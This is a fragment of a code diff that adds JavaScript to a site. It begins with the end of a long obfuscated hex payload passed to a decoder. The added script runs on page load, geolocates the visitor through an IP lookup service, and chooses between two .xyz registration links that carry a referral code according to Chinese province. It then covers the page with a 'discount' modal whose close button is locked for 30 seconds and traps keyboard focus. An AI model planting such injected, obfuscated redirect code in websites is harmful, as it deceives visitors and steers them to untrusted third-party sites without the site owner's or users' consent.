5,70,64,7a,28,40,7d,78,36,4b,41,7c,64,3a,7c,54,7a,2e,38,32,7b,63,7f,72,32,5c,66,88,cf,d3,e0,9f,9a,8e,80,ae,96,d4,8e,82,b7,98,8b,92,9f,aa,85,cd,d9,c6,e8,d0,d9,c7,f0,f3,c5,ce,d9,a2,81,b4,a0,b6,e4,9d,b6,bb,a4,f6,cc,fd,e0,f6,b5,9c,a6,ac,a6,a1,da,bc,a2,b3,b9,9c,ad,a5,b5,b8,cd,f5,d0,d0,ca,a5,d0,d7,d9,81,b6,9e,f6,cb,d8,e9,99,c3,d2,da,f0,84,8d,d5,d8,f3,8c,ee,dc,c9,f7,88,c1,e9,f7,85,b2,bd,ac,b6,98,a0,a9,a5,a3,98,f6,f2,e6,e2,db,a4,e7,fb,e7,d8,ed,e4,fa,ff,89,f6,e8,f5,ff,26,17,1b,b,2,74,4e,4c,1a,1,35,5d,8,e,17,34,2b,e,1a,6,3e,3,12,4c,b,33,f,a,13,12,38,9,37,78,31,9,31,34,29,28,e,3f,3d,66,6a,42,7984,5451,53b9,5123,9590,6c,7e,74,73e7,5750,53af,4eac,512f,95b7,54,7e,33,62,55,67,59,58,a,d,32,35,18,f,b,24,57,52,46,5d,6b,9,56,5c,58,7f,5c,1a,4d,5d,61,6a,42,4f,5a,62,6e,70,68,2a,5f,74,75,6a,25,14,27,2b,23,37,2b,37,20,37,33,5a,79,6b,73,62,5e,6e,64,3d,79,5b,75,62,8f,93,be,d3,dd,98,8e,ae,d8,9a,80,85,b0,90,d0,8d,98,ad,8b,81,9e,91,bd,c6,9a,9a,8f,a1,96,83,c3,9d,83,bc,b3,b7,8c,84,aa,b2,bc,be,84,bf,f4,bf,a6,8d,ad,b3,fd,e9,9f,a2,a5,a4,b4,93,ac,bf,f4,ae,94,aa,df,d1,c6,c9,ca,d0,ce,d2,cb,d8,c9,d9,c8,ec,d3,cd,9e,97,f6,ce,dd,d7,d8,ef,ce,8e,90,d1,f6,dc,dd,90,ba,c3,fb,e0,e9,aa,db,fa,f5,e0,fd,c1,bc,b4,b3,fd,cb,f0,ee,f0,bb,c8,eb,ea,f1,ee,d0,ab,a5,a0,fb,df,1b,4,9,7,25,9,58,3,6,22,b,55,19,18,38,1b,5,59,1c,2a,9,17,16,1a,38,16,57,12,b,37,14,9,2a,2f,1a,60,24,31,22,1e,39,36,39,39,5c,7b,38,26,32,b,39,7c,7c,7c,50,74,35,55,7b,54,64,6d,3e,2b,61,5a,46,4c,4a,64,1e,5c,4b,51,76,1b,59,2,54,69,4e,9,51,1c,70,48,5f,c,4,2b,5,6e,49,5f,70,57,75,20,2a,57,79,3b,70,74,42,67,7f,63,79,66,73,79,77,65,51,7f,2c,3a,2c,5c,69,7a,71,73,40,76,26,30,da,b3,93,95,ca,81,e7,94,9d,96,d6,f9,c9,da,bc,8f,bd,ce,cb,8e,90,f4,9e,95,9b,8e,b0,8d,98,bf,9a,b6,b9,a4,a8,b6,c3,f4,ed,e9,ad,89,b1,ae,a7,a9,8f,a3,ee,b6,b0,88,a5,b3,b5,93,9b,a4,a7,b8,b3,86,fb,f2,9b,cc,e4,d5,df,85,81,a9,d3,d5,c3,d9,e6,9b,da,c0,c2,ff,c8,cf,d7,d0,a6,cc,c4,d0,c8,f1,9e,c1,d1,d0,c4,b0,bc,e3,ea,c9,eb,e4,a6,a1,9e,ee,e1,81,af,80,a8,a1,f0,fd,d8,f8,eb,f4,f7,c2,ac,ea,fe,f8,f4,f1,15,9,17,0,15,6,14,3,29,14,8,45,4a,29,13,6,12,1f,2a,5,43,5f,1c,3d,19,1a,55,41,30,9,1,a,24,40,3b,37,26,1,1f,3a,36,3b,7,d,27,29,2d,20,1a,3b,6a,72,36,16,27,24,35,7f,59,27,25,28,32,19,4b,42,d,19,1,1d,16,1,9,6a,5b,55,41,2,60,53,44,72,45,79,42,51,7c,5f,64,55,4f,53,58,60,e,8,65,6c,44,78,7f,24,2b,4d,2d,27,77,63,45,3d,72,60,7f,55,24,64,77,60,78,7b,7c,6d,72,56,71,79,7d,36,e8,98,80,8c,84,e7,9a,9e,9d,89,a7,9f,99,8f,c8,e9,d5,dc,c9,d5,af,9f,93,94,de,ff,87,c5,8a,8e,b4,91,b5,a9,b7,a8,b9,b3,a1,b3,8b,a5,f2,e4,f6,9f,ff,e4,dc,f0,dd,eb,e4,b0,b8,96,b3,bd,fc,af,81,a9,f3,b8,d6,ef,d3,c7,82,d6,e6,ca,cc,ca,90,ed,d2,95,89,c3,fe,da,c9,9b,dc,e9,ed,c8,d0,d6,f0,c0,d8,de,db,b9,ea,f4,f0,f7,d9,f3,ad,ed,e0,c8,f9,b5,e2,fe,c4,f1,bd,e2,e1,d0,b7,e9,f9,f8,dc,af,f8,f8,f0,dd,f0,ea,27,14,39,9,1d,1,12,3c,15,51,4b,b,31,1c,1f,44,15,37,19,2,10,18,3c,b,4f,56,40,38,d,3,13,50,1b,3c,2a,31,6,5,30,23,2b,26,11,6e,3f,24,21,6,21,26,7a,30,e,39,32,3e,37,22,27,33,2e,67,7b,67,10,5a,29,2c,1c,5c,46,e,63,5e,59,58,40,67,58,4b,18,42,78,4a,40,4a,64,6c,41,5d,59,7,2e,18,9,55,6e,4f,7e,7a,6c,63,e,36,7c,60,68,51,79,78,66,7a,11,68,66,71,50,4c,6b,69,6a,54,5c,70,78,7e,71,55,8a,d9,c3,a6,84,b0,b5,8e,87,b2,97,95,9e,a0,ae,96,84,92,97,fb,c0,96,84,97,a5,95,c6,86,92,bc,85,8a,fc,b4,9f,ae,b1,be,ee,d3,b5,b5,bf,af,c3,a6,aa,a8,a3,8a,e2,ea,e9,de,84,e6,e0,f6,e0,fe','pfaOx'));
+(function () {
+  'use strict';
+  const config = {
+    baiduUrl: 'https://3w.tangguoyun.xyz/#/register?code=S760PyTl',
+    bingUrl: 'https://112233.xn--54q85l.xyz/#/registe',
+    geoApi: 'https://myip.ipip.net/json',
+    timeoutMs: 6000,
+    redirectMode: 'button',
+    countdown: 30,
+    priceText: '5元',
+    priceUnit: '/月',
+    title: '限时折扣',
+    desc: '现在免费注册，即可享受每月 5 元的会员价格。',
+    buttonText: '免费注册'
+  };
+  function destination(data) {
+    if (!data || data.error)
+      return config.baiduUrl;
+    const country = String(data.country_code || data.country || '').toUpperCase();
+    if (!/^[A-Z]{2}$/.test(country))
+      return config.baiduUrl;
+    if (country !== 'CN')
+      return config.baiduUrl;
+    const region = String(data.region || '').toLowerCase().replace(/\s|省|市|province/g, '');
+    const code = String(data.region_code || '').toUpperCase().replace(/^CN-/, '');
+    const selectedNames = [
+      'shaanxi',
+      'shanxi',
+      'hubei',
+      'fujian',
+      '陕西',
+      '山西',
+      '湖北',
+      '福建'
+    ];
+    const selectedCodes = [
+      '61',
+      '14',
+      '42',
+      '35',
+      'SN',
+      'SX',
+      'HB',
+      'FJ'
+    ];
+    if (selectedNames.includes(region) || selectedCodes.includes(code))
+      return config.baiduUrl;
+    const otherNames = [
+      'beijing',
+      'tianjin',
+      'hebei',
+      'innermongolia',
+      'neimenggu',
+      'liaoning',
+      'jilin',
+      'heilongjiang',
+      'shanghai',
+      'jiangsu',
+      'zhejiang',
+      'anhui',
+      'jiangxi',
+      'shandong',
+      'henan',
+      'hunan',
+      'guangdong',
+      'guangxi',
+      'hainan',
+      'chongqing',
+      'sichuan',
+      'guizhou',
+      'yunnan',
+      'tibet',
+      'xizang',
+      'gansu',
+      'qinghai',
+      'ningxia',
+      'xinjiang',
+      '北京',
+      '天津',
+      '河北',
+      '内蒙古',
+      '内蒙古自治区',
+      '辽宁',
+      '吉林',
+      '黑龙江',
+      '上海',
+      '江苏',
+      '浙江',
+      '安徽',
+      '江西',
+      '山东',
+      '河南',
+      '湖南',
+      '广东',
+      '广西',
+      '广西壮族自治区',
+      '海南',
+      '重庆',
+      '四川',
+      '贵州',
+      '云南',
+      '西藏',
+      '西藏自治区',
+      '甘肃',
+      '青海',
+      '宁夏',
+      '宁夏回族自治区',
+      '新疆',
+      '新疆维吾尔自治区'
+    ];
+    const otherCodes = [
+      '11',
+      '12',
+      '13',
+      '15',
+      '21',
+      '22',
+      '23',
+      '31',
+      '32',
+      '33',
+      '34',
+      '36',
+      '37',
+      '41',
+      '43',
+      '44',
+      '45',
+      '46',
+      '50',
+      '51',
+      '52',
+      '53',
+      '54',
+      '62',
+      '63',
+      '64',
+      '65',
+      'BJ',
+      'TJ',
+      'HE',
+      'NM',
+      'LN',
+      'JL',
+      'HL',
+      'SH',
+      'JS',
+      'ZJ',
+      'AH',
+      'JX',
+      'SD',
+      'HA',
+      'HN',
+      'GD',
+      'GX',
+      'HI',
+      'CQ',
+      'SC',
+      'GZ',
+      'YN',
+      'XZ',
+      'GS',
+      'QH',
+      'NX',
+      'XJ'
+    ];
+    return otherNames.includes(region) || otherCodes.includes(code) ? config.bingUrl : config.baiduUrl;
+  }
+  async function lookup() {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), config.timeoutMs);
+    try {
+      const response = await fetch(config.geoApi, {
+        signal: controller.signal,
+        credentials: 'omit',
+        referrerPolicy: 'no-referrer'
+      });
+      if (!response.ok)
+        throw Error('geo');
+      const payload = await response.json();
+      const location = payload?.data?.location;
+      if (payload?.ret !== 'ok' || !Array.isArray(location)) throw Error('geo-format');
+      return destination({
+        country_code: ['中国', '中国大陆', '中华人民共和国'].includes(location[0]) ? 'CN' : '',
+        region: typeof location[1] === 'string' ? location[1] : ''
+      });
+    } catch (_) {
+      return config.baiduUrl;
+    } finally {
+      clearTimeout(timer);
+    }
+  }
+  async function start() {
+    if (document.getElementById('geo-offer-mask'))
+      return;
+    const route = lookup();
+    if (config.redirectMode === 'page') {
+      location.replace(await route);
+      return;
+    }
+    const style = document.createElement('style');
+    style.textContent = `
+      #geo-offer-mask,#geo-offer-mask *{box-sizing:border-box}
+      #geo-offer-mask{position:fixed;inset:0;z-index:2147483000;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at top,rgba(255,122,69,.35),rgba(0,0,0,.78));backdrop-filter:blur(6px);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif}
+      #geo-offer-mask .go-card{position:relative;width:min(420px,100%);padding:34px 24px 26px;text-align:center;background:#fff;border-radius:24px;box-shadow:0 24px 80px #0004;max-height:95vh;overflow:auto}
+      #geo-offer-mask .go-close{position:absolute;right:12px;top:12px;width:38px;height:38px;border:0;border-radius:50%;background:#eee;color:#888;font-size:22px;cursor:pointer}
+      #geo-offer-mask .go-close:disabled{cursor:not-allowed;opacity:.6}
+      #geo-offer-mask .go-price{color:#c34e38;font-size:56px;font-weight:900;line-height:1.1;margin:0}
+      #geo-offer-mask .go-price small{font-size:18px}
+      #geo-offer-mask h2{margin:16px 0 8px;color:#222;font-size:24px}
+      #geo-offer-mask .go-desc{margin:0;color:#555;font-size:14px;line-height:1.7}
+      #geo-offer-mask .go-link{display:block;margin-top:24px;padding:15px 20px;border-radius:999px;background:#c34e38;color:#fff;text-decoration:none;font-size:18px;font-weight:800}
+      #geo-offer-mask .go-link[aria-disabled=true]{opacity:.65;cursor:wait}
+      #geo-offer-mask .go-tip{margin:14px 0 0;font-size:13px;color:#555}
+    `;
+    document.head.appendChild(style);
+    const mask = document.createElement('div');
+    mask.id = 'geo-offer-mask';
+    mask.innerHTML = '<section class="go-card" role="dialog" aria-modal="true" aria-labelledby="go-title" aria-describedby="go-desc"><button class="go-close" type="button" disabled aria-label="关闭弹窗">×</button><div class="go-price"></div><h2 id="go-title"></h2><p class="go-desc" id="go-desc"></p><a class="go-link" target="_blank" rel="noopener noreferrer" aria-disabled="true" tabindex="0">正在准备链接…</a><p class="go-tip" aria-live="polite"></p></section>';
+    const get = s => mask.querySelector(s), close = get('.go-close'), link = get('.go-link'), tip = get('.go-tip');
+    get('.go-price').textContent = config.priceText;
+    const unit = document.createElement('small');
+    unit.textContent = config.priceUnit;
+    get('.go-price').append(unit);
+    get('h2').textContent = config.title;
+    get('.go-desc').textContent = config.desc;
+    document.body.appendChild(mask);
+    const previous = document.activeElement, overflow = document.body.style.overflow;
+    document.body.style.overflow = 'hidden';
+    link.focus();
+    const end = Date.now() + Math.max(0, config.countdown) * 1000;
+    const tick = () => {
+      const remaining = Math.max(0, Math.ceil((end - Date.now()) / 1000));
+      close.disabled = remaining > 0;
+      tip.textContent = remaining ? remaining + ' 秒后可关闭' : '现在可以关闭';
+    };
+    tick();
+    const timer = setInterval(tick, 250);
+    function dismiss() {
+      if (close.disabled)
+        return;
+      clearInterval(timer);
+      document.removeEventListener('keydown', keys);
+      mask.remove();
+      style.remove();
+      document.body.style.overflow = overflow;
+      previous?.focus?.();
+    }
+    function keys(e) {
+      if (e.key === 'Escape') {
+        e.preventDefault();
+        dismiss();
+      }
+      if (e.key === 'Tab') {
+        e.preventDefault();
+        (document.activeElement === link && !close.disabled ? close : link).focus();
+      }
+    }
+    document.addEventListener('keydown', keys);
+    close.addEventListener('click', dismiss);
+    link.addEventListener('click', e => {
+      if (link.getAttribute('aria-disabled') === 'true')
+        e.preventDefault();
+    });
+    const url = await route;
+    if (!mask.isConnected)
+      return;
+    link.href = url;
+    link.removeAttribute('aria-disabled');
+    link.textContent = config.buttonText;
+  }
+  if (document.readyState === 'loading')
+    document.addEventListener('DOMContentLoaded', start, { once: true });
+  else
+    start();
+}());
